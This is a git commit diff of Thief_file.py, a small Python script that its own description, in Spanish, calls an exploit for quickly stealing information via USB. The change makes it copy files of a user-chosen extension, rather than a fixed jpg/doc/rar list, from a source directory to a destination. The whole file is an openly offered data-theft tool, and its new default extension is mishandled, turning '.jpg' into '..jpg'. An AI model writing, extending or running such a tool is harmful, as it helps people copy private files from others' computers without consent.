8251141be258e4bbb2413d5090ce53f39728eb88
K2uci <148832097+K2uci@users.noreply.github.com>
2023-12-10 17:00:12 -0500

    yes

--- Thief_file.py
+++ Thief_file.py
@@ -13,24 +13,19 @@ def log_file(archivo_error):
         with open(str(args.destination+'log_error.txt'),'w') as file:
             file.write(str(archivo_error+'\n'))
 
-
 #Copia todas las fotos de una pc
 def copiar(directorio,extencio_user):
     lista_archivos = os.listdir(directorio)
-    EXTENCIONES = ['jpg','doc','rar']
-    extenciones_validas = []
-    for extencion_v in str(extencio_user):
-        extenciones_validas.append(EXTENCIONES[int(extencion_v)])
-    for archivo in lista_archivos:
-        for extencion in extenciones_validas:
-            if extencion in archivo:
-                directorio_archivo = os.path.join(directorio,archivo)
-                try:
-                    shutil.copy(directorio_archivo,args.destination)
-                except shutil.SameFileError:
-                    pass
-                except PermissionError:
-                    log_file(directorio_archivo)
+    extencio_user = str('.'+extencio_user)
+    for archivo in lista_archivos:   
+        if extencio_user in archivo:
+            directorio_archivo = os.path.join(directorio,archivo)
+            try:
+                shutil.copy(directorio_archivo,args.destination)
+            except shutil.SameFileError:
+                pass
+            except PermissionError:
+                log_file(directorio_archivo)
 
 #Muestra tods los archivos de una pc
 def mostrar_archivos(directorio):
@@ -49,17 +44,14 @@ def mostrar_archivos(directorio):
 
 if __name__ == '__main__':
     print(r"Created by K2s_UCI")
-    print(r"Created by K2s_UCI")
     parser = argparse.ArgumentParser(description="Exploit con el objetivo de robar informacion de manera\
-    rapida, pruebame via USB ")
+    rapida, pruebame via USB y agrega la extencion")
     parser.add_argument('-s',"--source" ,type=str ,help="Choose the sources to copy")
     parser.add_argument('-d',"--destination" ,type=str ,default=os.getcwd() ,help="Chose the destination to copy,default USB")
-    parser.add_argument('-e',"--extension", type=int ,default=0, help="Chose the extension to copy 1-9")
-    print(r"Select your extencion: 0->JPG 1->DOC 2->RAR")
+    parser.add_argument('-e',"--extension", type=str ,default=".jpg", help="Chose the extension to copy")
     args = parser.parse_args()
 
     mostrar_archivos(args.source)
-
 
     
 
